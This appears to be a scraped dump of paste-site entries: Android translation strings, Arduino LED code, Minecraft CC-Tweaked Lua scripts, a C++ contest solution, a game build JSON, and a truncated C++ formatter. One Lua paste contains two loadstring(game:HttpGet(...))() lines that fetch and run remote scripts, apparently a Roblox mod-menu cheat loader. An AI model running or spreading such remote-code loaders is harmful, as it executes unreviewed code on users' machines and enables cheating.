    <string name=""off"">Aus</string>
    <string name=""minimum"">Minimum</string>
    <string name=""medium"">Mittel</string>
    <string name=""maximum"">Maximal</string>
    <string name=""maximum_"">Maximal</string>
    <string name=""photo"">Foto</string>
    <string name=""divider"">Teiler</string>
    <string name=""transparency"">Transparenz</string>
    <string name=""color"">Farbe</string>
    <string name=""text"">Text</string>
    <string name=""background"">Hintergrund</string>
    <string name=""contacts"">Kontakte</string>
    <string name=""current"">Aktuelles</string>
    <string name=""upcoming"">Kommendes</string>
    <string name=""notification_sound_may_not_work"">Der Benachrichtigungston funktioniert möglicherweise nicht</string>
    <string name=""no_access_to_notification_sound"">Kein Zugriff auf den Benachrichtigungston</string>
    <string name=""error_reading_contacts"">Fehler beim Lesen von Kontakten</string>
    <string name=""attention"">Achtung</string>
    <string name=""i_want_to_do_it"">Ich will es machen</string>
    <string name=""doze_recommendation"">Es wird empfohlen, die Batterieoptimierung für diese App zu deaktivieren. Andernfalls funktionieren Ereignisbenachrichtigungen möglicherweise nicht.</string>
    <string name=""close"">Schliessen</string>
    <string name=""unknown"">Unbekannte</string>
    <string name=""select_account"">Wählen Sie Konten</string>
    <string name=""accounts_not_found"">Konten nicht gefunden</string>
    <string name=""phone"">Telefon</string>
    <string name=""simcard"">SIM Karte</string>
    <string name=""vibration"">Vibration</string>
    <string name=""widget_update"">Aktualisieren</string>
    <string name=""every_1_hour"">Jede 1 stunde</string>
    <string name=""every_3_hours"">Jede 3 stunden</string>
    <string name=""every_6_hours"">Jede 6 stunden</string>
    <string name=""every_12_hours"">Jede 12 stunden</string>
    <string name=""every_24_hours"">Jede 24 stunden</string>
    <string name=""notification_test"">Benachrichtigungstest</string>
    <string name=""in_1_minute"">Nach 1 minute</string>
    <string name=""in_3_minutes"">Nach 3 minuten</string>
    <string name=""in_5_minutes"">Nach 5 minuten</string>
    <string name=""in_10_minutes"">Nach 10 minuten</string>
    <string name=""in_15_minutes"">Nach 15 minuten</string>
    <string name=""in_30_minutes"">Nach 30 minuten</string>
    <string name=""in_60_minutes"">Nach 60 minuten</string>
    <string name=""hello"">Hallo!</string>
    <string name=""notified_after"">Sie sollten eine Benachrichtigung erhalten</string>
    <string name=""new_contact"">Neuer Kontakt</string>
    <string name=""first_name"">Vorname</string>
    <string name=""last_name"">Nachname</string>
    <string name=""contact_name_empty_warning"">Kontaktname darf nicht leer sein</string>
    <string name=""account"">Konto</string>
    <string name=""click_action"">Aktion bei Klick</string>
    <string name=""show_contact"">Kontakt anzeigen</string>
    <string name=""open_application"">Applikation öffnen</string>
    <string name=""font_size"">Schriftgrösse</string>
    <string name=""_default"">Standard</string>
    <string name=""small"">Klein</string>
    <string name=""large"">Gross</string>
    <string name=""event_day"">Ereignistag</string>
    <string name=""other_days"">Andere Tage</string>
    <string name=""auto"">Automatisch</string>
    <string name=""notification"">Benachrichtigung</string>
    <string name=""notification_management"">Benachrichtigungsverwaltung</string>
    <string name=""adding_to_blacklist"">Zur Schwarzeliste hinzufügen</string>
    <string name=""adding_to_whitelist"">Zur Weisseliste hinzufügen</string>
    <string name=""help_translate"">Beim Übersetzen helfen</string>
    <string name=""help_translate_descr"">Möchtest Du uns helfen, diese App in Deine Sprache zu übersetzen? Wir schätzen Deine Unterstützung!</string>
    <string name=""event_filter"">Ereignisfilter</string>
    <string name=""hide_blacklisted_events"">Ereignisse mit deaktivierten Benachrichtigungen ausblenden</string>
    <string name=""nothing"">Nichts</string>
    <string name=""not_selected"">Nicht ausgewählt</string>
    <string name=""translation_help"">Dank für die Übersetzungshilfe</string>
    <string name=""no_access_to_contact_app"">Kein Zugriff auf Kontakt-App</string>
    <string name=""name_format"">Namensformat</string>
    <string name=""first_last_name"">Vorname, nachname</string>
    <string name=""last_first_name"">Nachname, vorname</string>
    <string name=""close_after_click"">Nach Klick schliessen</string>
    <string name=""privacy_policy"">Datenschutzbestimmungen</string>
    <string name=""no_contacts_permission"">Keine Berechtigung zum Zugriff auf Kontakte</string>
    <string name=""include_daily"">Darunter täglich</string>
    <string name=""event_age"">Ereignis Alter</string>
    <string name=""change_color"">Farbe ändern</string>
    <string name=""reset"">Zurücksetzen</string>
    <string name=""show_photos"">Fotos zeigen</string>
    <string name=""sort"">Sortieren</string>
    <string name=""by_date"">Nach Datum</string>
    <string name=""by_name"">Nach Namen</string>
    <string name=""by_age"">Nach Alter</string>
    <string name=""invert"">Umkehren</string>
    <string name=""auto_alignment"">Automatische Ausrichtung</string>
    <string name=""indents"">Einzüge</string>
    <string name=""group_notifications"">Gruppenbenachrichtigungen</string>
    <string name=""repeat_interval"">Wiederholungsintervall</string>
    <string name=""auto_repeat"">Automatische Wiederholung</string>
    <string name=""auto_repeat_descr"">Wenn deaktiviert, können Benachrichtigungen nur mit der Schaltfläche „Verschieben“ wiederholt werden.</string>
    <string name=""complete"">Vollständig</string>
    <string name=""m_5"">5 Minuten</string>
    <string name=""m_10"">10 Minuten</string>
    <string name=""m_15"">15 Minuten</string>
    <string name=""m_30"">30 Minuten</string>
    <string name=""h_1"">1 Stunde</string>
    <string name=""h_3"">3 Stunden</string>
    <string name=""h_6"">6 Stunden</string>
    <string name=""h_12"">12 Stunden</string>
    <string name=""yesterday"">Gestern</string>
    <string name=""days_ago"">Vor %d %s</string>
    <string name=""app_notification_disabled"">Benachrichtigungen für diese App sind deaktiviert</string>
    <string name=""open_notification_settings"">Benachrichtigungseinstellungen öffnen</string>
    <string name=""open_app_system_settings"">Öffnen Sie die App-Systemeinstellungen</string>
    <string name=""not_show_again"">Nicht mehr anzeigen</string>
    <string name=""troubleshooting"">Fehlerbehebung</string>
    <string name=""notification_problems"">Benachrichtigungsprobleme</string>
    <string name=""doze_info"">Die Android-Akkuoptimierung kann App-Benachrichtigungen blockieren oder verzögern.</string>
    <string name=""how_to_disable_doze"">So deaktivieren die Batterieoptimierung</string>
    <string name=""open_doze_settings"">Öffnen die Einstellungen zur Akkuoptimierung</string>
    <string name=""all"">Alle</string>
    <string name=""for_30_days"">Für 30 Tage</string>
    <string name=""for_60_days"">Für 60 Tage</string>
    <string name=""for_90_days"">Für 90 Tage</string>
    <string name=""for_180_days"">Für 180 Tage</string>
    <string name=""show_events"">Events anzeigen</string>
    <string name=""enable_notification"">Benachrichtigungen aktivieren</string>
    <string name=""disable_notification"">Benachrichtigungen deaktivieren</string>
    <string name=""blacklist_info"">Schwarzeliste (alle Benachrichtigungen standardmässig aktiviert)</string>
    <string name=""whitelist_info"">Weisseliste (alle Benachrichtigungen standardmässig deaktiviert)</string>
    <string name=""no_events"">Keine Ereignisse</string>
    <string name=""no_contacts"">Keine Kontakte</string>
    <string name=""event_age_settings"">Einstellungen für das Ereignisalter</string>
    <string name=""type"">Typ</string>
    <string name=""round"">Runden</string>
    <string name=""wide"">Breit</string>
    <string name=""next_to_name"">Neben dem Namen</string>
    <string name=""next_to_date"">Neben dem Datum</string>
    <string name=""loading"">Laden</string>
    <string name=""normal"">Normal</string>
    <string name=""apply"">Anwenden</string>
</resources>"
RENT9MXJ,LED Controller rev_01,pleasedontcode,Arduino,Sunday 6th of July 2025 04:36:19 PM CDT,"/********* Pleasedontcode.com **********

	Pleasedontcode thanks you for automatic code generation! Enjoy your code!

	- Terms and Conditions:
	You have a non-exclusive, revocable, worldwide, royalty-free license
	for personal and commercial use. Attribution is optional; modifications
	are allowed, but you're responsible for code maintenance. We're not
	liable for any loss or damage. For full terms,
	please visit pleasedontcode.com/termsandconditions.

	- Project: LED Controller
	- Source Code NOT compiled for: Arduino Uno
	- Source Code created on: 2025-07-06 21:34:20

********* Pleasedontcode.com **********/

/****** SYSTEM REQUIREMENTS *****/
/****** SYSTEM REQUIREMENT 1 *****/
	/* Implement an LED strip control system using the */
	/* FastLED library on an Arduino Uno, including */
	/* functions for color changing, brightness */
	/* adjustment, and pattern display. */
/****** END SYSTEM REQUIREMENTS *****/

/* START CODE */
/****** DEFINITION OF LIBRARIES *****/
#include <FastLED.h>

// Define the number of LEDs
#define NUM_LEDS 60
// Define the data pin (change as needed)
#define DATA_PIN 6

// Create LED array
CRGB leds[NUM_LEDS];

// Variables for brightness and pattern
uint8_t currentBrightness = 128;
uint8_t currentPattern = 0;

// Pattern functions
void patternRainbow() {
  fill_rainbow(leds, NUM_LEDS, currentPattern * 8, 7);
}

void patternStripe() {
  for (int i = 0; i < NUM_LEDS; i++) {
    if (i % 2 == 0) {
      leds[i] = CRGB::Red;
    } else {
      leds[i] = CRGB::Blue;
    }
  }
}

void patternFade() {
  fadeToBlackBy(leds, NUM_LEDS, 10);
  leds[currentPattern * 5 % NUM_LEDS] = CRGB::White;
}

// Function prototypes for color and brightness control
void setColor(CRGB color);
void changePattern();
void adjustBrightness(uint8_t brightness);

/// Function to set the entire strip to a specific color
void setColor(CRGB color) {
  fill_solid(leds, NUM_LEDS, color);
  FastLED.show();
}

/// Function to change to the next pattern
void changePattern() {
  currentPattern = (currentPattern + 1) % 3;
  switch (currentPattern) {
    case 0:
      patternRainbow();
      break;
    case 1:
      patternStripe();
      break;
    case 2:
      patternFade();
      break;
  }
}

/// Function to adjust brightness
void adjustBrightness(uint8_t brightness) {
  currentBrightness = brightness;
  FastLED.setBrightness(currentBrightness);
}

void setup() {
  // Initialize serial communication for debugging
  Serial.begin(9600);
  // Initialize LED strip
  FastLED.addLeds<NEOPIXEL, DATA_PIN>(leds, NUM_LEDS);
  // Set initial pattern
  patternRainbow();
  // Set initial brightness
  FastLED.setBrightness(currentBrightness);
}

void loop() {
  // Example usage:
  
  // Change pattern every 10 seconds
  static uint32_t lastChangeTime = 0;
  if (millis() - lastChangeTime > 10000) {
    changePattern();
    lastChangeTime = millis();
  }
  
  // Adjust brightness with serial input (if available)
  if (Serial.available()) {
    char cmd = Serial.read();
    if (cmd == 'u') {
      // increase brightness
      uint8_t new_brightness = constrain(FastLED.getBrightness() + 10, 0, 255);
      adjustBrightness(new_brightness);
    } else if (cmd == 'd') {
      // decrease brightness
      uint8_t new_brightness = constrain(FastLED.getBrightness() - 10, 0, 255);
      adjustBrightness(new_brightness);
    } else if (cmd == 'c') {
      // change color randomly
      setColor(CRGB::Green);
    }
  }

  // Repeat current pattern
  if (currentPattern == 0) {
    patternRainbow();
  } else if (currentPattern == 1) {
    patternStripe();
  } else if (currentPattern == 2) {
    patternFade();
  }
  
  delay(100);
}
"
Qqr5wzZP,Русский,XJIOP,XML,Sunday 6th of July 2025 04:25:26 PM CDT,"<resources>
    <string name=""app_name"">Дни рождения контактов</string>
    <string name=""contacts_events"">События контактов</string>
    <string name=""settings"">Настройки</string>
    <string name=""enable"">Включить</string>
    <string name=""reminders"">Напоминания</string>
    <string name=""time_to_remind"">Время напоминаний</string>
    <string name=""sound_notifications"">Звук уведомлений</string>
    <string name=""in"">Через</string>
    <string name=""birthday"">День рождения</string>
    <string name=""anniversary"">Годовщина</string>
    <string name=""event"">Событие</string>
    <string name=""today"">Сегодня</string>
    <string name=""tomorrow"">Завтра</string>
    <string name=""without_sound"">Без звука</string>
    <string name=""dark_theme"">Темная тема</string>
    <string name=""about_app"">О приложении</string>
    <string name=""version"">Версия</string>
    <string name=""cat_main"">ОСНОВНЫЕ</string>
    <string name=""cat_notification"">УВЕДОМЛЕНИЯ</string>
    <string name=""cat_widget"">ВИДЖЕТ</string>
    <string name=""cat_app"">ПРИЛОЖЕНИЕ</string>
    <string name=""on_day_of_event"">В день события</string>
    <string name=""_1_day_before"">За 1 день</string>
    <string name=""_2_day_before"">За 2 дня</string>
    <string name=""_3_day_before"">За 3 дня</string>
    <string name=""_7_day_before"">За 7 дней</string>
    <string name=""_14_day_before"">За 14 дней</string>
    <string name=""_30_day_before"">За 30 дней</string>
    <string name=""select_days"">Выбрать дни</string>
    <string name=""language"">Язык</string>
    <string name=""name_not_specified"">Имя не указано</string>
    <string name=""contacts_app_not_found"">Приложение Контактов не найдено</string>
    <string name=""configuration"">Конфигурация</string>
    <string name=""save"">Сохранить</string>
    <string name=""cancel"">Отмена</string>
    <string name=""yes"">Да</string>
    <string name=""no"">Нет</string>
    <string name=""note"">Заметка</string>
    <string name=""text_dots"">текст …</string>
    <string name=""event_name"">Имя события …</string>
    <string name=""birthdays"">Дни рождения</string>
    <string name=""anniversaries"">Годовщины</string>
    <string name=""others"">Другие</string>
    <string name=""other"">Другое</string>
    <string name=""customs"">Особые</string>
    <string name=""custom"">Особый</string>
    <string name=""events"">События</string>
    <string name=""events_editor"">Редактор событий</string>
    <string name=""include_year"">Указать год</string>
    <string name=""saved"">Сохранено</string>
    <string name=""delete"">Удалить</string>
    <string name=""deleted"">Удалено</string>
    <string name=""add"">Добавить</string>
    <string name=""added"">Добавлено</string>
    <string name=""cant_open_link"">Не удается открыть ссылку</string>
    <string name=""unknown_error"">Неизвестная ошибка</string>
    <string name=""app_action_not_found"">Приложение для этого действия не найдено</string>
    <string name=""rate_app_text"">Если вам понравилось это приложение, пожалуйста, поставьте оценку.\n\nСпасибо за Вашу поддержку!</string>
    <string name=""rate"">Хорошо</string>
    <string name=""remind_later"">Напомнить позже</string>
    <string name=""no_thanks"">Нет, спасибо</string>
    <string name=""share"">Поделиться</string>
    <string name=""remind_in"">Напомнить через %s</string>
    <string name=""postpone"">Отложить</string>
    <string name=""select"">Выбрать</string>
    <string name=""date"">Дата</string>
    <string name=""name"">Имя</string>
    <string name=""label_name"">Имя ярлыка</string>
    <string name=""ok"">OK</string>
    <string name=""day"">день</string>
    <string name=""day2"">дня</string>
    <string name=""days"">дней</string>
    <string name=""search"">Поиск</string>
    <string name=""feedback"">Обратная связь</string>
    <string name=""rounded_corners"">Закругленные углы</string>
    <string name=""off"">Выключено</string>
    <string name=""minimum"">Минимальные</string>
    <string name=""medium"">Средние</string>
    <string name=""maximum"">Максимальные</string>
    <string name=""maximum_"">Максимальный</string>
    <string name=""photo"">Фото</string>
    <string name=""divider"">Разделитель</string>
    <string name=""transparency"">Прозрачность</string>
    <string name=""color"">Цвет</string>
    <string name=""text"">Текст</string>
    <string name=""background"">Задний фон</string>
    <string name=""contacts"">Контакты</string>
    <string name=""current"">Текущий</string>
    <string name=""upcoming"">Предстоящий</string>
    <string name=""notification_sound_may_not_work"">Звук уведомлений может не работать</string>
    <string name=""no_access_to_notification_sound"">Нет доступа к звуку уведомлений</string>
    <string name=""error_reading_contacts"">Ошибка при чтении контактов</string>
    <string name=""attention"">Внимание</string>
    <string name=""i_want_to_do_it"">Я хочу это сделать</string>
    <string name=""doze_recommendation"">Рекомендуется отключить экономию батареи для этого приложения. В противном случае, уведомления событий могут не работать.</string>
    <string name=""close"">Закрыть</string>
    <string name=""unknown"">Неизвестно</string>
    <string name=""select_account"">Выбрать учетные записи</string>
    <string name=""accounts_not_found"">Учетные записи не найдены</string>
    <string name=""phone"">Телефон</string>
    <string name=""simcard"">SIM-карта</string>
    <string name=""vibration"">Вибрация</string>
    <string name=""widget_update"">Обновление</string>
    <string name=""every_1_hour"">Каждый 1 час</string>
    <string name=""every_3_hours"">Каждые 3 часа</string>
    <string name=""every_6_hours"">Каждые 6 часов</string>
    <string name=""every_12_hours"">Каждые 12 часов</string>
    <string name=""every_24_hours"">Каждые 24 часа</string>
    <string name=""notification_test"">Тест уведомлений</string>
    <string name=""in_1_minute"">Через 1 минуту</string>
    <string name=""in_3_minutes"">Через 3 минуты</string>
    <string name=""in_5_minutes"">Через 5 минут</string>
    <string name=""in_10_minutes"">Через 10 минут</string>
    <string name=""in_15_minutes"">Через 15 минут</string>
    <string name=""in_30_minutes"">Через 30 минут</string>
    <string name=""in_60_minutes"">Через 60 минут</string>
    <string name=""hello"">Привет!</string>
    <string name=""notified_after"">Вы должны получить уведомление</string>
    <string name=""new_contact"">Новый контакт</string>
    <string name=""first_name"">Имя</string>
    <string name=""last_name"">Фамилия</string>
    <string name=""contact_name_empty_warning"">Имя контакта не может быть пустым</string>
    <string name=""account"">Учетная запись</string>
    <string name=""click_action"">Действие по клику</string>
    <string name=""show_contact"">Показать контакт</string>
    <string name=""open_application"">Открыть приложение</string>
    <string name=""font_size"">Размер шрифта</string>
    <string name=""_default"">По умолчанию</string>
    <string name=""small"">Маленький</string>
    <string name=""large"">Крупный</string>
    <string name=""event_day"">День события</string>
    <string name=""other_days"">Другие дни</string>
    <string name=""auto"">Авто</string>
    <string name=""notification"">Уведомление</string>
    <string name=""notification_management"">Управление уведомлениями</string>
    <string name=""adding_to_blacklist"">Добавлять в черный список</string>
    <string name=""adding_to_whitelist"">Добавлять в белый список</string>
    <string name=""help_translate"">Помощь в переводе</string>
    <string name=""help_translate_descr"">Хотите помочь с переводом этого приложения на ваш язык? Мы ценим вашу поддержку!</string>
    <string name=""event_filter"">Фильтр событий</string>
    <string name=""hide_blacklisted_events"">Скрывать события с отключенными уведомлениями</string>
    <string name=""nothing"">Ничего</string>
    <string name=""not_selected"">Не выбраны</string>
    <string name=""translation_help"">Спасибо за помощь в переводе</string>
    <string name=""no_access_to_contact_app"">Нет доступа к приложению контактов</string>
    <string name=""name_format"">Формат имени</string>
    <string name=""first_last_name"">Имя, фамилия</string>
    <string name=""last_first_name"">Фамилия, имя</string>
    <string name=""close_after_click"">Закрывать после клика</string>
    <string name=""privacy_policy"">Политика конфиденциальности</string>
    <string name=""no_contacts_permission"">Нет разрешения на доступ к контактам</string>
    <string name=""include_daily"">Включая ежедневно</string>
    <string name=""event_age"">Возраст события</string>
    <string name=""change_color"">Изменить цвет</string>
    <string name=""reset"">Сбросить</string>
    <string name=""show_photos"">Отображать фото</string>
    <string name=""sort"">Сортировка</string>
    <string name=""by_date"">По дате</string>
    <string name=""by_name"">По имени</string>
    <string name=""by_age"">По возрасту</string>
    <string name=""invert"">Инвертировать</string>
    <string name=""auto_alignment"">Автоматическое выравнивание</string>
    <string name=""indents"">Отступы</string>
    <string name=""group_notifications"">Группировать уведомления</string>
    <string name=""repeat_interval"">Интервал повтора</string>
    <string name=""auto_repeat"">Автоповтор</string>
    <string name=""auto_repeat_descr"">Если отключено, уведомления можно повторять только с помощью кнопки Отложить.</string>
    <string name=""complete"">Завершить</string>
    <string name=""m_5"">5 минут</string>
    <string name=""m_10"">10 минут</string>
    <string name=""m_15"">15 минут</string>
    <string name=""m_30"">30 минут</string>
    <string name=""h_1"">1 час</string>
    <string name=""h_3"">3 часа</string>
    <string name=""h_6"">6 часов</string>
    <string name=""h_12"">12 часов</string>
    <string name=""yesterday"">Вчера</string>
    <string name=""days_ago"">%d %s назад</string>
    <string name=""app_notification_disabled"">Уведомления для этого приложения отключены</string>
    <string name=""open_notification_settings"">Открыть настройки уведомлений</string>
    <string name=""open_app_system_settings"">Открыть системные настройки приложения</string>
    <string name=""not_show_again"">Больше не показывать</string>
    <string name=""troubleshooting"">Устранения неполадок</string>
    <string name=""notification_problems"">Проблемы с уведомлениями</string>
    <string name=""doze_info"">Оптимизация батареи Android может блокировать или задерживать уведомления приложения.</string>
    <string name=""how_to_disable_doze"">Как отключить оптимизацию батареи</string>
    <string name=""open_doze_settings"">Открыть настройки оптимизации батареи</string>
    <string name=""show_events"">Показывать события</string>
    <string name=""all"">Все</string>
    <string name=""for_30_days"">За 30 дней</string>
    <string name=""for_60_days"">За 60 дней</string>
    <string name=""for_90_days"">За 90 дней</string>
    <string name=""for_180_days"">За 180 дней</string>
    <string name=""enable_notification"">Включить уведомления</string>
    <string name=""disable_notification"">Отключить уведомления</string>
    <string name=""blacklist_info"">Черный список (все уведомления по умолчанию включены)</string>
    <string name=""whitelist_info"">Белый список (все уведомления по умолчанию отключены)</string>
    <string name=""no_events"">Нет событий</string>
    <string name=""no_contacts"">Нет контактов</string>
    <string name=""event_age_settings"">Настройки возраста события</string>
    <string name=""type"">Стиль</string>
    <string name=""round"">Круглый</string>
    <string name=""wide"">Широкий</string>
    <string name=""next_to_name"">Рядом с именем</string>
    <string name=""next_to_date"">Рядом с датой</string>
    <string name=""loading"">Загрузка</string>
    <string name=""normal"">Нормальный</string>
    <string name=""apply"">Применить</string>
</resources>"
zEp3yAQG,ColonyMon,Seepekaboo,Lua,Sunday 6th of July 2025 03:13:34 PM CDT,"--========================================================--
--  colony_dashboard.lua  •  CC-Tweaked + Colony Peripheral
--========================================================--

------------------------------------ optional monitor redirection
local mon = peripheral.find(""monitor"")
if mon then
  mon.setTextScale(0.5)
  term.redirect(mon)
end
term.clear()

------------------------------------ tiny helpers
local function centre(txt, y)
  local w = term.getSize()
  term.setCursorPos(math.floor((w - #txt) / 2) + 1, y)
  term.write(txt)
end

local PALETTE = { hdr = colours.yellow, ok = colours.lime, bg = colours.black }

---draw a horizontal bar  (0–1 range)
local function bar(label, pct, y)
  pct = math.max(0, math.min(1, pct or 0))
  local w = term.getSize()
  local width = w - #label - 6               -- "" ["", bar, ""]""
  local filled = math.floor(width * pct + 0.5)

  term.setCursorPos(1, y)
  term.write(label .. "" ["")
  term.setBackgroundColor(PALETTE.ok)
  term.write(("" ""):rep(filled))
  term.setBackgroundColor(PALETTE.bg)
  term.write(("" ""):rep(width - filled) .. ""]"")
end

------------------------------------ main paint routine
local function draw()
  term.clear()

  -- ── colony summary ─────────────────────────────────────────
  local okInfo, info = pcall(colony.getInfo, colony)
  if not okInfo or type(info) ~= ""table"" then
    centre(""§cUnable to read colony data!"", 1)
    return
  end

  term.setTextColour(PALETTE.hdr)
  centre(info.name or ""Colony"", 1)
  term.setTextColour(colours.white)

  centre(
    (""Citizens %d / %d   Happiness %.2f%%"")
      :format(info.citizens or 0,
               info.maxCitizens or 0,
               (info.happiness or 0) * 100),
    3
  )

  if info.raid then
    term.setTextColour(colours.red)
    centre(""⚠ RAID IN PROGRESS ⚠"", 4)
    term.setTextColour(colours.white)
  end

  bar(""Happiness "", info.happiness, 6)

  -- ── outstanding requests ───────────────────────────────────
  local okReq, req = pcall(colony.getRequests, colony)
  req = okReq and req or {}
  term.setCursorPos(1, 8)
  print(""Requests (first 5):"")
  if #req == 0 then
    print(""  – none –"")
  else
    for i = 1, math.min(5, #req) do
      local r = req[i]
      print((""  • %s ×%d  (%s)"")
        :format(r.items and r.items[1] and (r.items[1].displayName or r.items[1].name) or r.name,
                 r.count or r.minCount or 1,
                 r.target or ""unknown""))
    end
  end
end

------------------------------------ loop forever
while true do
  draw()
  sleep(5)              -- refresh every 5 s; tweak as you like
end
"
dcB5CLvF,The Great Revegation,tepyotin2,C++,Sunday 6th of July 2025 02:41:17 PM CDT,"#include <bits/stdc++.h>

using namespace std;

struct Con{
    int to;
    string s;
};

int n, m;
vector<vector<Con>> con;
vector<int> color;
bool check = false;
int ans = 0;

void dfs(int x, int v){
    color[x] = v;

    /*
    Check the nodes that are connected to the current node.
    If the connected node has been checked before, the value must be
    equal if the relation of these nodes are same and the value must
    be different if the relation of these nodes are supposed to be
    different, otherwise the pastures according to the cows are not
    possible and must return.
    If not visited before, send the new node to do dfs for that new
    node and make the value 1 or 2 according to whether the relation
    between these nodes are same or different and whether the current
    node has a value of 1 or 2.
    */

    for(Con c: con[x]){
        if(color[c.to] > 0){
            // cout << ""x: "" << x << "", c.to: "" << c.to << "", color[c.to]: "" << color[c.to] << '\n';
            if(c.s == ""S"" && color[c.to]!=v){
                check = true;
                return;
            }else if(c.s == ""D"" && color[c.to]==v){
                check = true;
                return;
            }
        }else{
            if(c.s == ""S""){
                dfs(c.to, v);
            }else if(c.s == ""D""){
                if(v == 1){
                    dfs(c.to, 2);
                }else{
                    dfs(c.to, 1);
                }
            }
        }
    }
}

int main(){
    freopen(""revegetate.in"", ""r"", stdin);
    freopen(""revegetate.out"", ""w"", stdout);

    cin >> n >> m;
    con.resize(n+1);
    color.resize(n+1, 0);
    for(int i=0; i<m; i++){
        string s;
        int a, b;
        cin >> s >> a >> b;
        con[a].push_back({b, s});
        con[b].push_back({a, s});
    }

    /*
    Use for loop to find the groups by getting values that hasn't been
    used before and sending to dfs function to get the group it is
    connected to
    */

    for(int i=1; i<=n; i++){
        if(color[i] == 0){
            dfs(i, 1);
            if(check){
                // cout << ""HI"" << '\n';
                cout << 0 << '\n';
                return 0;
            }else{
                // ans*=2;
                ans++;
            }
        }
    }
    // int len = (int)(log2(ans));
    // cout << bitset<64>(ans).to_string().substr(64-ans-1) << '\n';
    // string bi = """";
    // while(ans>0){
    //     int bit = ans%2;
    //     bi.push_back('0'+bit);
    //     ans/=2;
    // }
    // reverse(bi.begin(), bi.end());
    // cout << bi << '\n';

    /*
    The answer of this problem, if not 0, can only be a value that is 2
    to the power of some number, for example (2, 4, 8, 16, 32, 64, etc.).
    Since these values are all 10, 100, 1000, etc. with the amount of 0s
    being the amount that 2 is being powered by, we could just output 1
    and then 0 for the amount of times that the ans must be multiplied
    by itself, becomes the answer. The functions or methods for turning
    a number into binary value, as tried above would not work for this
    problem.
    */
       
    cout << ""1"";
    for(int i=0; i<ans; i++){
        cout << ""0"";
    }
    cout << '\n';

    return 0;
}"
C34Bu9Zf,IvanTheSkid decided to share his code with you!,IvanTheProtogen,Lua,Sunday 6th of July 2025 02:34:42 PM CDT,".
-- IvanTheSkid decided to share his code with you!

loadstring(game:HttpGet(""http://github.com/IvanTheProtogen/dumpsterfire/raw/main/fakepublicbathroomsim.lua""))() -- epik mod menu for fake public bathroom sim
loadstring(game:HttpGet(""http://github.com/IvanTheProtogen/ClientAdmin/raw/main/scripts/PersonalBloxbizStuff.lua""))() -- ivan's personal custom avatars for games with popmall

-- if you want more, check out ivan's repositories: http://github.com/IvanTheProtogen
-- feel free to share this paste!"
dewe7CxJ,Hylofear - Mathematically Correct Tahm Kench Build,raitono,JSON,Sunday 6th of July 2025 01:32:03 PM CDT,"{""title"":""Mathematically Correct Tahm Kench"",""associatedMaps"":[11,12],""associatedChampions"":[223],""blocks"":[{""items"":[{""id"":""3084"",""count"":1},{""id"":""4633"",""count"":1},{""id"":""3083"",""count"":1},{""id"":""3115"",""count"":1},{""id"":""3124"",""count"":1},{""id"":""3089"",""count"":1},{""id"":""3111"",""count"":1},{""id"":""3047"",""count"":1},{""id"":""3009"",""count"":1}],""type"":""New Block""}]}"
GWkdFUUV,FusionLaserController,BigBlow_,Lua,Sunday 6th of July 2025 12:38:00 PM CDT,"-- Configuration
local chargePower = 7           -- Signal strength required to cut power
local shootPower = 8            -- Signal strength required to fire the laser
local faceLaser = ""top""         -- Face used to detect laser amplifier charge and to send fire pulse
local facePower = ""right""       -- Face used to cut/restore power
local faceReset1 = ""front""      -- Reset signal face 1
local faceReset2 = ""bottom""     -- Reset signal face 2
local faceAlarm = ""left""        -- Face to emit redstone when laser is firing

-- Initialization
print(""Initialising system..."")
redstone.setOutput(facePower, true)
os.sleep(1)
redstone.setOutput(facePower, false)

-- Variable to track if power has been cut
local isPowered = false

-- Startup message
print(""Program starting..."")
print(""Waiting for redstone signal on "" .. faceLaser .. "" to charge the Laser Amplifier"")

-- Main loop
while true do
    -- Get redstone analog input from laser amplifier face
    local signalPower = redstone.getAnalogInput(faceLaser)
    print(""Signal strength on "" .. faceLaser .. "": "" .. signalPower)

    if signalPower == shootPower then
        -- If signal strength is equal to shootPower, fire the laser
        redstone.setOutput(faceLaser, true)
        redstone.setOutput(faceAlarm, true)
        print(""Laser Amplifier activated, firing!"")
        os.sleep(1)
        redstone.setOutput(faceLaser, false)
        redstone.setOutput(faceAlarm, false)

        -- Wait until signal drops to chargePower before cutting power
        while true do
            signalPower = redstone.getAnalogInput(faceLaser)
            if signalPower == chargePower then
                redstone.setOutput(facePower, true)
                print(""Laser Amplifier power cut."")
                isPowered = true
                break
            end
            os.sleep(0.1)
        end

    else
        os.sleep(0.1)
    end

    -- Monitor reset signals
    if redstone.getInput(faceReset1) or redstone.getInput(faceReset2) then
        print(""Reset signal received on "" .. faceReset1 .. "" or "" .. faceReset2 .. "". Resetting the power..."")

        if isPowered then
            redstone.setOutput(facePower, false)
            print(""Laser Amplifier power restored."")
            isPowered = false
        end

        os.sleep(0.5)
    end
end
"
vbbX4Rwd,Untitled,Tkap1,C++,Sunday 6th of July 2025 12:28:43 PM CDT,"
func void format_text2_(s_str_builder<16384>* builder, s_len_str format)
{
	builder->add(""%.*s"", expand_str(format));
}

template <typename t0, typename... targs>
func void format_text2_(s_str_builder<16384>* builder, s_len_str format, t0 val, targs... args)
{
	#define get_next_char(mi) ((mi) < format.count - 1) ? format[mi + 1] : 0;

	assert(format.count > 0);

	for(int i = 0; i < format.count; i += 1) {
		char float_fmt[32] = zero;
		float_fmt[0] = '%';
		float_fmt[1] = 'f';
		char c = format[i];
		char next_c = get_next_char(i);
		// @Fixme(tkap, 22/12/2024): will fail an assert with ""!{2,3}"" (sprite in text syntax)
		if(c == '{') {
			if(is_number(next_c)) {
				i += 1;
				char n = next_c;
				next_c = get_next_char(i);
				if(next_c == 'f') {
					i += 1;
					float_fmt[0] = '%';
					float_fmt[1] = '.';
					float_fmt[2] = n;
					float_fmt[3] = 'f';
					next_c = get_next_char(i);
				}
				else {
					assert(false);
				}
			}
			if(next_c == '}') {
				if constexpr(is_same<t0, s32> || is_same<t0, int>) {
					builder->add(""%i"", val);
				}
				else if constexpr(is_same<t0, b8>) {
					if(val) {
						builder->add(""true"");
					}
					else {
						builder->add(""false"");
					}
				}
				else if constexpr(is_same<t0, u16>) {
					builder->add(""%u"", val);
				}
				else if constexpr(is_same<t0, s_len_str>) {
					if(val.count > 0) {
						builder->add(""%.*s"", expand_str(val));
					}
				}
				else if constexpr(is_same<t0, const char*>) {
					builder->add(""%s"", val);
				}
				else if constexpr(is_same<t0, char*>) {
					builder->add(""%s"", val);
				}
				else if constexpr(is_same<t0, char>) {
					builder->add(""%c"", val);
				}
				else if constexpr(is_same<t0, float> || is_same<t0, double>) {
					builder->add(float_fmt, val);
				}
				else if constexpr(is_same<t0, s_v2>) {
					builder->add(""{%f, %f}"", val.x, val.y);
